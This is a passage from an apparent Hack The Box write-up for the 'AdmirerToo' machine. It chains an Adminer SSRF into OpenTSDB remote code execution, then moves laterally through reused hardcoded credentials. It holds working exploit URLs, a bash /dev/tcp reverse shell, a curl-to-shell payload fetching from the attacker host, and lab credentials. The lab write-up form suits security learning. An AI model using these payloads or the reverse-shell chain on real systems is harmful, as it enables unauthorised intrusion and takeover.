<p><a href="/assets/img/AdmirerToo/Untitled%205.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>

<aside>
üîë admirer_ro     *8CE6ACD7FC9ABDE377FF1CE332CE1D790E167086

</aside>

<p>Found user credentials cached within the login page:</p>

<p><a href="/assets/img/AdmirerToo/Untitled%206.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>

<aside>
üîë admirer_ro     1w4nn4b3adm1r3d2!

</aside>

<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="adminer-478-server-side-request-forgery---cve-2021-21311"><span class="me-2">Adminer 4.7.8 Server Side Request Forgery - CVE-2021-21311</span><a href="#adminer-478-server-side-request-forgery---cve-2021-21311" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21311">NVD</a></p>

<p>Commit that partially resolved the vulnerability:</p>

<p><a href="https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351">https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351</a></p>

<p>Because SSRF is still present but responses cannot be viewed if not with response code 200, we can force a 301 Redirect in order to read server response.</p>

<p>Python script to accept requests on port 80 and redirect them to an arbitrary host with a 301:</p>

<p><a href="https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd">Python script to accept requests on port 80 and redirect them to an arbitrary host with a 301</a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>python3 redirect.py 10099 http://10.10.11.137
</pre></td></tr></tbody></table></code></div></div>

<p>Connection to the attacker server using Elasticsearch module:</p>

<p><a href="/assets/img/AdmirerToo/Untitled%207.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%207.png" alt="Used the ‚Äúunhide‚Äù feature from burpsuite" loading="lazy"></a></p>

<p>Used the ‚Äúunhide‚Äù feature from burpsuite</p>

<p><a href="/assets/img/AdmirerToo/Untitled%208.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>

<h3 id="opentsdb-240-remote-code-execution---cve-2020-35476"><span class="me-2">OpenTSDB 2.4.0 Remote Code Execution - CVE-2020-35476</span><a href="#opentsdb-240-remote-code-execution---cve-2020-35476" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Enumerated internal port 4242:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>python3 redirect.py 10099 http://10.10.11.137:4242/
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/AdmirerToo/Untitled%209.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%209.png" alt="OpenTSDB" loading="lazy"></a></p>

<p>OpenTSDB</p>

<p>Enumerated OpenTSDB version:</p>

<p><a href="http://opentsdb.net/docs/build/html/api_http/version.html">/api/version</a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>python2 redirect.py <span class="nt">--port</span> 10099 http://10.10.11.137:4242/api/version
</pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"short_revision"</span><span class="p">:</span><span class="s2">"14ab3ef"</span><span class="p">,</span><span class="nl">"repo"</span><span class="p">:</span><span class="s2">"/home/hobbes/OFFICIAL/build"</span><span class="p">,</span><span class="nl">"host"</span><span class="p">:</span><span class="s2">"clhbase"</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"2.4.0"</span><span class="p">,</span><span class="nl">"full_revision"</span><span class="p">:</span><span class="s2">"14ab3ef8a865816cf920aa69f2e019b7261a7847"</span><span class="p">,</span><span class="nl">"repo_status"</span><span class="p">:</span><span class="s2">"MINT"</span><span class="p">,</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"hobbes"</span><span class="p">,</span><span class="nl">"branch"</span><span class="p">:</span><span class="s2">"master"</span><span class="p">,</span><span class="nl">"timestamp"</span><span class="p">:</span><span class="s2">"1545014415"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="known-vulnerability-for-opentsdb-240"><span class="me-2">Known vulnerability for OpenTSDB 2.4.0:</span><a href="#known-vulnerability-for-opentsdb-240" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p><a href="http://opentsdb.net/">OpenTSDB - A Distributed, Scalable Monitoring System</a></p>

<div class="table-wrapper"><table>
  <tbody>
    <tr>
      <td>[Arbitrary Code Execution in net.opentsdb:opentsdb</td>
      <td>CVE-2020-35476</td>
      <td>Snyk](https://security.snyk.io/vuln/SNYK-JAVA-NETOPENTSDB-1041751)</td>
    </tr>
  </tbody>
</table></div>

<p>Exploited the SSRF to trigger the RCE on port 4242:</p>

<p><a href="/assets/img/AdmirerToo/Untitled%2010.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 redirect.py <span class="nt">--port</span> 10098 <span class="s2">"http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system('touch/tmp/poc.txt')]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json"</span>
serving at port 10098
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 14:43:52] <span class="s2">"GET / HTTP/1.0"</span> 301 -
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 14:43:52] <span class="s2">"GET / HTTP/1.0"</span> 301 -
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/AdmirerToo/Untitled%2011.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%2011.png" alt="No such name for 'metrics': 'sys.cpu.nice‚Äô" loading="lazy"></a></p>

<p>No such name for ‚Äòmetrics‚Äô: ‚Äòsys.cpu.nice‚Äô</p>

<p>Enumerated available metrics trough API:</p>

<p><a href="https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http">OpenTSDB - Get all metrics via http</a></p>

<p><a href="http://opentsdb.net/docs/build/html/api_http/suggest.html">/api/suggest</a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>python2 redirect.py <span class="nt">--port</span> 10099 <span class="s2">"http://10.10.11.137:4242/api/suggest?type=metrics"</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="s2">"http.stats.web.hits"</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Took the existent PoC and fixed with the available metric:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python2</span> <span class="n">redirect</span><span class="p">.</span><span class="n">py</span> <span class="o">--</span><span class="n">port</span> <span class="mi">10098</span> <span class="sh">'</span><span class="s">http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(</span><span class="sh">"</span><span class="s">touch/tmp/poc.txt</span><span class="sh">"</span><span class="s">)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span><span class="sh">'</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"plotted"</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span><span class="nl">"timing"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"cachehit"</span><span class="p">:</span><span class="s2">"disk"</span><span class="p">,</span><span class="nl">"etags"</span><span class="p">:[[</span><span class="s2">"host"</span><span class="p">]],</span><span class="nl">"points"</span><span class="p">:</span><span class="mi">8</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Reverse shell:</p>

<p><strong>rev.sh</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>/bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.2/10100 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 10:54:50] <span class="s2">"GET / HTTP/1.1"</span> 200 -
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 10:56:33] <span class="s2">"GET /rev.sh HTTP/1.1"</span> 200 -
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 10:57:33] <span class="s2">"GET /rev.sh HTTP/1.1"</span> 200 -
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>python2 redirect.py <span class="nt">--port</span> 10099 <span class="s1">'http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system("curl${IFS}http://10.10.14.2/rev.sh|/bin/sh")]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</span>
serving at port 10099
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 10:56:33] <span class="s2">"GET / HTTP/1.0"</span> 301 -
10.10.11.137 - - <span class="o">[</span>24/Apr/2022 10:57:33] <span class="s2">"GET / HTTP/1.0"</span> 301 -
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 10100
listening on <span class="o">[</span>any] 10100 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.137] 43194
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>549<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
opentsdb@admirertoo:/<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>opentsdb<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>opentsdb<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>opentsdb<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="lateral-movement-to-jennifer"><span class="me-2">Lateral Movement to jennifer</span><a href="#lateral-movement-to-jennifer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="local-enumeration"><span class="me-2">Local enumeration</span><a href="#local-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Enumerated users:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>opentsdb@admirertoo:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
opentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false
hbase:x:1001:1001::/opt/hbase/:/sbin/nologin
mysql:x:105:114:MySQL Server,,,:/nonexistent:/bin/false
jennifer:x:1002:100::/home/jennifer:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Debian-exim:x:107:113::/var/spool/exim4:/usr/sbin/nologin
devel:x:1003:1003::/home/devel:/sbin/nologin
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated open ports:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>opentsdb@admirertoo:/tmp<span class="nv">$ </span>netstat <span class="nt">-polentau</span>
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      0          15337      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      105        16191      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:8080          0.0.0.0:<span class="k">*</span>               LISTEN      0          14268      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:39384         127.0.0.1:4242          ESTABLISHED 33         876179     -                    keepalive <span class="o">(</span>5420.82/0/0<span class="o">)</span>
tcp        0    187 10.10.11.137:43194      10.10.14.2:10100        ESTABLISHED 1000       1090591    11229/bash           on <span class="o">(</span>0.23/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:39380         127.0.0.1:4242          ESTABLISHED 33         876148     -                    keepalive <span class="o">(</span>5420.82/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:39378         127.0.0.1:4242          ESTABLISHED 33         876635     -                    keepalive <span class="o">(</span>5289.74/0/0<span class="o">)</span>
tcp6       0      0 127.0.1.1:16020         :::<span class="k">*</span>                    LISTEN      1001       18331      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      0          15339      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::16030                :::<span class="k">*</span>                    LISTEN      1001       19459      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.1.1:16000         :::<span class="k">*</span>                    LISTEN      1001       19448      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:2181          :::<span class="k">*</span>                    LISTEN      1001       19416      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::16010                :::<span class="k">*</span>                    LISTEN      1001       18326      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      0          15352      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::4242                 :::<span class="k">*</span>                    LISTEN      1000       21278      557/java             off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:60916         127.0.1.1:16020         TIME_WAIT   0          0          -                    timewait <span class="o">(</span>47.37/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:2181          127.0.0.1:45726         ESTABLISHED 1001       18332      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:2181          127.0.0.1:45714         ESTABLISHED 1001       18301      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:4242          127.0.0.1:39384         ESTABLISHED 1000       876860     557/java             keepalive <span class="o">(</span>5420.82/0/0<span class="o">)</span>
tcp6       0      0 127.0.1.1:16000         127.0.1.1:44267         ESTABLISHED 1001       20913      -                    keepalive <span class="o">(</span>5682.30/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:45726         127.0.0.1:2181          ESTABLISHED 1001       19458      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:45742         127.0.0.1:2181          ESTABLISHED 1001       20286      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:2181          127.0.0.1:45742         ESTABLISHED 1001       20915      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:4242          127.0.0.1:39380         ESTABLISHED 1000       876791     557/java             keepalive <span class="o">(</span>5420.82/0/0<span class="o">)</span>
tcp6       0      0 127.0.1.1:44267         127.0.1.1:16000         ESTABLISHED 1001       20909      -                    keepalive <span class="o">(</span>5682.30/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:45714         127.0.0.1:2181          ESTABLISHED 1001       18300      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 127.0.0.1:4242          127.0.0.1:39378         ESTABLISHED 1000       876636     557/java             keepalive <span class="o">(</span>5289.74/0/0<span class="o">)</span>
udp        0      0 10.10.11.137:40632      1.1.1.1:53              ESTABLISHED 101        1104895    -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 10.10.11.137:35291      8.8.8.8:53              ESTABLISHED 101        1105921    -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Found hardcoded credentials:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="n">opentsdb</span><span class="o">@</span><span class="n">admirertoo</span><span class="o">:~</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">ri</span> <span class="n">admirer_ro</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">adminer</span><span class="o">/</span>
<span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">adminer</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">servers</span><span class="mf">.</span><span class="n">php</span><span class="o">:</span>    <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admirer_ro'</span><span class="p">,</span>
<span class="n">opentsdb</span><span class="o">@</span><span class="n">admirertoo</span><span class="o">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">adminer</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">servers</span><span class="mf">.</span><span class="n">php</span>
<span class="o">&lt;?</span><span class="n">php</span>
<span class="k">return</span> <span class="p">[</span>
  <span class="s1">'localhost'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
<span class="c1">//    'username' =&gt; 'admirer',</span>
<span class="c1">//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',</span>
<span class="c1">// Read-only account for testing</span>
    <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admirer_ro'</span><span class="p">,</span>
    <span class="s1">'pass'</span>     <span class="o">=&gt;</span> <span class="s1">'1w4nn4b3adm1r3d2!'</span><span class="p">,</span>
    <span class="s1">'label'</span>    <span class="o">=&gt;</span> <span class="s1">'MySQL'</span><span class="p">,</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
      <span class="s1">'admirer'</span> <span class="o">=&gt;</span> <span class="s1">'Admirer DB'</span><span class="p">,</span>
    <span class="p">)</span>
  <span class="p">),</span>
<span class="p">];</span>
</pre></td></tr></tbody></table></code></div></div>

<aside>
üîë admirer     bQ3u7^AxzcB7qAsxE3

</aside>

<p>Log in as jennifer reusing known passwords:</p>

<aside>
üîë jennifer     bQ3u7^AxzcB7qAsxE3

</aside>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>opentsdb@admirertoo:~<span class="nv">$ </span>su jennifer
Password: 
jennifer@admirertoo:/usr/share/opentsdb<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>jennifer<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
jennifer@admirertoo:/usr/share/opentsdb<span class="nv">$ </span><span class="nb">cat</span> ~/user.txt 
c171776485c8d1852be98f88edbba763
</pre></td></tr></tbody></table></code></div></div>

<h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="local-enumeration-1"><span class="me-2">Local Enumeration</span><a href="#local-enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="port-8080---http"><span class="me-2">Port 8080 - HTTP</span><a href="#port-8080---http" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Forwarded port 8080:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span>ssh <span class="nt">-L</span> 1337:localhost:8080 jennifer@admirertoo.htb
The authenticity of host <span class="s1">'admirertoo.htb (10.10.11.137)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:6GHqCefcB0XKD8lrY40SKb5COmsxVdTiXV4NYplmxbY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>admirertoo.htb<span class="s1">' (ED25519) to the list of known hosts.
jennifer@admirertoo.htb'</span>s password:
Linux admirertoo 4.19.0-18-amd64 <span class="c">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
